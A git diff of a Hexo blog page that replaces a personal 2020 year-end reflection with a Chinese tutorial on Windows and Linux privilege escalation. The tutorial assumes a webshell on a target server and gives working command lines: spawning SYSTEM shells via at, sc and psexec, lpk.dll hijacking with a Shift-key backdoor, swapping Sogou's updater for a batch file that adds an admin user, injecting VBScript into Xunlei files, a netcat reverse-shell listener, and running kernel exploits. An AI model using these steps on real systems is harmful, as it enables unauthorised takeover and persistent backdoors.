@@ -18,15 +18,15 @@
   <meta name="author" content="HackerTerry">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言前段时间是考试周，一直忙于复习而没有时间更新博客，现在放假了，就来写（shui）一篇吧，嘿嘿！ 正文终于，我们要告别这个跌宕起伏令人悲喜交加的2020年。这是充满了挑战的一年，也是充满了机遇的一年，这一年，有人欢喜，有人悲伤；这一年，有人获得，有人失去。匆匆忙忙间，最终还是来到的告别的时候。再见了，让你我不开心的2020年；你好呀，充满了希望的2021年！2020年，注定是不平凡的一年。身为一">
+    <meta name="description" content="Windows提权内核补丁提权在目标机执行systeminfo命令，再把得到的信息复制粘贴到以下网站。 提权辅助网站：http:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F; 数据库提权由于篇幅太长，所以单独写了一篇文章。具体方法，可参考本人的另一篇文章。 计划任务提权Windows自带的计划任务分为at和schtasks两种。 AT提权：适用于win7以下的逻辑性利用，创造新的指定文件时">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2020年度总结">
-<meta property="og:url" content="https://rookieterry.github.io/2021/01/24/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:title" content="Windows和Linux系统提权">
+<meta property="og:url" content="https://rookieterry.github.io/2021/10/29/Windows%E5%92%8CLinux%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="HackerTerry&#39;s Blog">
-<meta property="og:description" content="前言前段时间是考试周，一直忙于复习而没有时间更新博客，现在放假了，就来写（shui）一篇吧，嘿嘿！ 正文终于，我们要告别这个跌宕起伏令人悲喜交加的2020年。这是充满了挑战的一年，也是充满了机遇的一年，这一年，有人欢喜，有人悲伤；这一年，有人获得，有人失去。匆匆忙忙间，最终还是来到的告别的时候。再见了，让你我不开心的2020年；你好呀，充满了希望的2021年！2020年，注定是不平凡的一年。身为一">
+<meta property="og:description" content="Windows提权内核补丁提权在目标机执行systeminfo命令，再把得到的信息复制粘贴到以下网站。 提权辅助网站：http:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F; 数据库提权由于篇幅太长，所以单独写了一篇文章。具体方法，可参考本人的另一篇文章。 计划任务提权Windows自带的计划任务分为at和schtasks两种。 AT提权：适用于win7以下的逻辑性利用，创造新的指定文件时">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-01-24T10:50:23.000Z">
-<meta property="article:modified_time" content="2022-09-16T06:19:05.868Z">
+<meta property="article:published_time" content="2021-10-29T10:37:09.000Z">
+<meta property="article:modified_time" content="2022-09-16T11:14:16.763Z">
 <meta property="article:author" content="HackerTerry">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -34,7 +34,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>2020年度总结 - HackerTerry&#39;s Blog</title>
+  <title>Windows和Linux系统提权 - HackerTerry&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -238,7 +238,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="2020年度总结"></span>
+            <span id="subtitle" data-typed-text="Windows和Linux系统提权"></span>
           
         </div>
 
@@ -254,8 +254,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-01-24 18:50" pubdate>
-          星期日, 一月 24日 2021, 6:50 晚上
+        <time datetime="2021-10-29 18:37" pubdate>
+          星期五, 十月 29日 2021, 6:37 晚上
         </time>
       </span>
     
@@ -267,7 +267,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          778 字
+          3.3k 字
         
       </span>
     
@@ -279,7 +279,7 @@
         
         
           <!-- compatible with older versions-->
-          7 分钟
+          28 分钟
         
       </span>
     
@@ -325,12 +325,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">2020年度总结</h1>
+            <h1 style="display: none">Windows和Linux系统提权</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：8 小时前
+                    本文最后更新于：4 小时前
                   
                 
               </p>
@@ -338,9 +338,66 @@
             
               <div class="markdown-body">
                 
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间是考试周，一直忙于复习而没有时间更新博客，现在放假了，就来写（shui）一篇吧，嘿嘿！</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>终于，我们要告别这个跌宕起伏令人悲喜交加的2020年。这是充满了挑战的一年，也是充满了机遇的一年，这一年，有人欢喜，有人悲伤；这一年，有人获得，有人失去。匆匆忙忙间，最终还是来到的告别的时候。再见了，让你我不开心的2020年；你好呀，充满了希望的2021年！<br>2020年，注定是不平凡的一年。身为一名武汉本地人，我能更深切地感受到新冠疫情给我的生活带来的影响：高考试卷难度下调，导致高考失利；线上教学效果甚微，让我对返校复学充满期盼；疫情期间武汉封城，导致我被困老家40余天······然而，疫情除了给我带来打击以外，也让我找到了能为之奋斗的目标–成为一名网络&#x2F;信息安全工程师。高考后的暑假，我学会了自己组装一台台式电脑，学会了折腾智能路由器并给它们刷各种第三方固件，学会了搭建自己的私有云服务器；上大学以后，我不仅学会了用pr进行视频剪辑，用arctime pro制作字幕，还学会了用WordPress建立了自己的个人博客。回首2020，既有高考失利的失望，也有获得荣誉的骄傲，例如获得全国大学生英语竞赛全国一等奖，阿里云网站设计大赛优秀奖（毕竟零基础）······<br>回首上半年，我活的很颓废；回首下半年，我的生活有了光 。在其它学院的学长学姐的帮助下，我的大学生活逐渐步入正轨。第一次交女性朋友，第一次和女生出去玩，第一次参加志愿者活动······有太多的第一次。认识到了很多有趣的人，虽然不是我想象中的来自全国各地，但也让我很开心。纵使我没能考到理想的大学，认识这些人，让我觉得人间值得！</p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>希望在2021这新的一年，我能够顺利拿到驾照，通过四级考试，在美赛中再创佳绩，也祝我和我的室友们全体脱单！凡是过往，皆为序章，2021年，大家一起冲冲冲！</p>
+                <h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><h3 id="内核补丁提权"><a href="#内核补丁提权" class="headerlink" title="内核补丁提权"></a>内核补丁提权</h3><p>在目标机执行<code>systeminfo</code>命令，再把得到的信息复制粘贴到以下网站。</p>
+<p>提权辅助网站：<a target="_blank" rel="noopener" href="http://bugs.hacking8.com/tiquan/">http://bugs.hacking8.com/tiquan/</a></p>
+<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><p>由于篇幅太长，所以单独写了一篇文章。具体方法，可参考本人的另一篇文章。</p>
+<h3 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h3><p>Windows自带的计划任务分为<code>at</code>和<code>schtasks</code>两种。</p>
+<p><strong>AT提权</strong>：适用于win7以下的逻辑性利用，创造新的指定文件时间允许，将获取system权限</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">at <span class="hljs-number">20</span>:<span class="hljs-number">55</span> /interactive cmd.exe<br></code></pre></td></tr></table></figure>
+
+<p><strong>SC反弹–创建服务</strong>：绑定执行文件cmd，执行弹出system提权</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> Create syscmd binPath= <span class="hljs-string">&quot;cmd /K start&quot;</span> <span class="hljs-built_in">type</span>= own <span class="hljs-built_in">type</span>= interact<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> syscmd<br></code></pre></td></tr></table></figure>
+
+<p><strong>PS提权（仅win2008）：</strong>需要win安装pstools&#x2F;ps插件，允许即可</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">psexec.exe <span class="hljs-literal">-accepteula</span> <span class="hljs-literal">-s</span> <span class="hljs-literal">-i</span> <span class="hljs-literal">-d</span> notepad.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="DLL劫持提权"><a href="#DLL劫持提权" class="headerlink" title="DLL劫持提权"></a>DLL劫持提权</h3><p>Windows程序启动的时候需要dll（动态链接库）。如果这些dll不存在，则可以通过在应用程序要查找的位置放置恶意dll来提权。通常，Windows应用程序有其预定义好的搜索dll的路径，它会根据下面的顺序进行搜索：</p>
+<p>1.应用程序加载的目录</p>
+<p>2.C:\Windows\System32 </p>
+<p>3.C:\Windows\System </p>
+<p>4.C:\Windows </p>
+<p>5.当前工作目录Current Working Directory，CWD </p>
+<p>6.在PATH环境变量的目录（先系统后用户）</p>
+<p>这样的加载顺序很容易导致一个系统dll被劫持，因为只要攻击者将目标文件和恶意dll放在一起即可,导致恶意dll先于系统dll加载，而系统dll是非常常见的，所以当时基于这样的加载顺序，出现了大量受影响软件。</p>
+<h4 id="lpk-dll提权"><a href="#lpk-dll提权" class="headerlink" title="lpk.dll提权"></a>lpk.dll提权</h4><p>系统本身的lpk.dll文件位于C:\WINDOWS\system32和C:WINDOWS\system\dllcache目录下。lpk.dll病毒的典型特征是感染存在可执行文件的目录，并隐藏自身，删除后又再生成，当同目录中的exe文件运行时，lpk.dll就会被Windows动态链接，从而激活病毒，进而导致不能彻底清除。</p>
+<p>这里我们使用t00ls论坛编写的dll提权小工具–T00ls Lpk Sethc v4（使用时务必关掉杀软）。不过使用前提是对方服务器开启了远程桌面功能（不一定是3389端口，这时可以用<code>tasklist /svc</code>命令查看pid，再用<code>netstat -ano</code>命令查找对应端口）。</p>
+<p>在拿到webshell的前提下，将lpk.dll上传到目标服务器带有exe的目录下，当exe被执行后，就会动态链接lpk.dll。当用户重启机器时，lpk.dll会劫持远程连接。这时我们只需连按5次shift键启用后门，并同时按住Ctrl键和设定的两个热键，就会弹出密码框。接下来的操作就很容易了，图形化界面有手就行。</p>
+<h3 id="第三方软件提权"><a href="#第三方软件提权" class="headerlink" title="第三方软件提权"></a>第三方软件提权</h3><p>第三方软件提权，就是利用第三方软件存在的漏洞来进行获取一个权限的操作。</p>
+<h4 id="搜狗输入法提权"><a href="#搜狗输入法提权" class="headerlink" title="搜狗输入法提权"></a>搜狗输入法提权</h4><p>由于搜狗输入法默认设置是自动更新（很少有人去更改这个设置），更新程序没有对exe做任何校验直接在输入法升级时调用运行，而且搜狗输入法为了方便更新，所在文件夹默认读写、执行权限全开，导致我们可以上传bat脚本编译后的恶意exe程序，替换原有的更新程序，进行提权操作。</p>
+<p>在获取webshell的前提下，在某个盘下找到了搜狗的路径：x:\Program Files\SogouInput。</p>
+<p>编写以下批处理脚本（这里以创建用户并添加管理员组为例）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off<br>@net user hack hack123 /add<br>@net localgroup administrators hack /add<br></code></pre></td></tr></table></figure>
+
+<p>用Quick Batch File Compiler编译为exe程序，上传我们的PinyinUp.exe文件，把之前搜狗路径下的PinyinUp文件改个名字。当服务器管理员更新词库的时候就会调用我们的PinyinUp.exe程序，然后执行我们之前写的bat脚本中的命令，即添加hack用户到管理员组。</p>
+<h4 id="迅雷提权"><a href="#迅雷提权" class="headerlink" title="迅雷提权"></a>迅雷提权</h4><p>我们每次在网页中使用迅雷下载文件时，迅雷都会自动调用安装目录中的geturl.htm和getAllurl.htm文件来获取下载链接、bt种子等资源。我们可以利用这一特性，更改迅雷安装目录下的这两个文件。而且迅雷安装目录的所有权限全开，也给我们提权提供了便利。同样的，需要通过webshell找到迅雷安装目录。</p>
+<p>在其中任意一个文件结尾加上这段vbs脚本代码：</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">&lt;script language=<span class="hljs-string">&quot;VBScript&quot;</span>&gt;<br><span class="hljs-keyword">Set</span> vbs=<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)<br>vbs.run <span class="hljs-string">&quot;cmd /c 要执行的命令&quot;</span>,<span class="hljs-number">0</span><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>当服务器管理员使用迅雷下载文件时，VBScript脚本里面的命令便会执行，提权操作顺利完成。</p>
+<h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>Linux提权相对于windows来说方法比较单一，主要提权方式为suid提权，内核提权，环境变量提权，计划任务提权，第三方服务提权，今天来记载一下关于suid提权以及内核提权，以及对目标linux信息收集的判断，以及漏洞探针。</p>
+<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>在进行Linux内核提权之前，我们一般先查看内核版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br>lsb_release -a<br></code></pre></td></tr></table></figure>
+
+<p>通过内核版本找到对应exp后，在拿到webshell的前提下反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 监听端口<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span> <span class="hljs-comment">#如果看着不顺眼可以用这句命令改为交互式界面</span><br></code></pre></td></tr></table></figure>
+
+<p>在Linux系统内进行编译并赋权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc exp.c -o exp<br><span class="hljs-built_in">chmod</span> +x exp<br></code></pre></td></tr></table></figure>
+
+<p>运行exp：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./exp<br></code></pre></td></tr></table></figure>
+
+<p>验证提权是否成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p>如果返回结果是root，则提权成功。无论哪个Linux发行版都是如此。</p>
+<p>但是手工信息收集效率不高，这里推荐两款信息收集与漏洞探针的自动化脚本，<br>信息收集：LinEnum.sh<br>漏洞探针：linux-exploit-suggster2</p>
+<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>首先了解suid与guid概念，所谓suid就是使用具有suid的文件时候，将可以赋予suid权限命令的用户一样的权限去运行这个文件，好比root给a文件赋予suid，当我们以普通权限user去运行a，也将以root权限运行该文件。guid的概念就是将suid里面user用户的权限更改为group组的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 手工赋予suid权限：</span><br><span class="hljs-built_in">chmod</span> u+s xxx<br><span class="hljs-comment"># 手工删除suid权限：</span><br>suid u-s xxx<br><span class="hljs-comment"># 手工搜寻本机suid的命令：</span><br>find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; ;<br><span class="hljs-comment"># 搜寻guid命令：</span><br>find / -perm -g=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br><br><span class="hljs-comment"># suid提权就是使用具有suid的命令去执行其他命令，因为具有suid的命令具备root权限，从而实现突破普通权限，获取root权限去执行命令</span><br><span class="hljs-comment"># 一些常见的可以使用的suid命令提权</span><br>nmap<br>vim<br>less<br>more<br>nano<br><span class="hljs-built_in">cp</span><br><span class="hljs-built_in">mv</span><br>find<br>等等······<br></code></pre></td></tr></table></figure>
+
+<p>suid命令查询网站：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.提权方法有部分适用在不同环境，当然也有通用方法<br>2.提权方法也有操作系统版本区分，特性决定方法利用面<br>3.提权方法有部分需要特定环境，如数据库,第三方提权等</p>
+<p>提权的骚姿势还有很多，例如中间件漏洞提权、令牌窃取提权，由于篇幅有限，这里我就不展开了。</p>
 
                 
               </div>
@@ -359,7 +416,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%94%9F%E6%B4%BB%E7%82%B9%E6%BB%B4/" class="category-chain-item">生活点滴</a>
+  <a href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="category-chain-item">权限提升</a>
   
   
 
@@ -379,8 +436,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>2020年度总结</div>
-      <div>https://rookieterry.github.io/2021/01/24/2020年度总结/</div>
+      <div>Windows和Linux系统提权</div>
+      <div>https://rookieterry.github.io/2021/10/29/Windows和Linux系统提权/</div>
     </div>
     <div class="license-meta">
       
@@ -392,7 +449,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>星期日, 一月 24日 2021, 6:50 晚上</div>
+          <div>星期五, 十月 29日 2021, 6:37 晚上</div>
         </div>
       
       
@@ -436,9 +493,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/26/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E5%BC%80%E7%AE%B1-%E5%88%9D%E4%BD%93%E9%AA%8C/" title="R2S软路由开箱&amp;初体验">
+                      <a href="/2021/10/31/Kali%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%89%EF%BC%89-WiFi%E9%92%93%E9%B1%BC%E5%92%8C%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/" title="Kali渗透（三）--WiFi钓鱼和断网攻击">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">R2S软路由开箱&amp;初体验</span>
+                        <span class="hidden-mobile">Kali渗透（三）--WiFi钓鱼和断网攻击</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -446,8 +503,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/12/23/%E7%BE%A4%E6%99%96NAS%E9%85%8D%E7%BD%AEDNSPodDDNS%E5%AE%9E%E7%8E%B0%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE/" title="群晖NAS配置DNSPodDDNS实现外网访问">
-                        <span class="hidden-mobile">群晖NAS配置DNSPodDDNS实现外网访问</span>
+                      <a href="/2021/10/28/Kali%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89-DNS%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E4%B8%8E%E9%92%93%E9%B1%BC/" title="Kali渗透（一）--DNS域名劫持与钓鱼">
+                        <span class="hidden-mobile">Kali渗透（一）--DNS域名劫持与钓鱼</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
